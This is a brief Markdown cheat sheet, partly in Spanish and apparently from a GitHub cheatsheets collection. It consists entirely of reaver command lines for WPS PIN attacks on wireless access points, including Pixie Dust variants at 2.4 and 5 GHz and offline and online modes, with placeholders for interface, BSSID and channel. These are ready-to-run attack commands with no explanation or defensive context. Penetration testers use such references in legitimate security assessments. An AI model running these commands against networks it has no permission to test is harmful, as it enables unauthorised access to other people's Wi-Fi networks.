# Reaver Cheat Sheet

#### WPS PIN Attack
```
reaver -i <INTERFACE> -b <BSSID-AP>
```

#### WPS PIN attack usando PixieWPS a 2.4GHz
```
reaver -i <INTERFACE> -b <BSSID-AP> -vv -K
```

#### WPS PIN attack usando PixieWPS a 5GHz
```
reaver -i <INTERFACE> -b <BSSID-AP> -5 -vv -K 1
```

#### WPS PIN Attack Offline
```
reaver -i <INTERFACE> -b <BSSID-AP> -c <CHANNEL> -K -SNLAvv
```

#### WPS PIN Attack Online
```
reaver -i <INTERFACE> -b <BSSID-AP> -c <CHANNEL> -SNLAsvv -d 1 -r 5:3
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)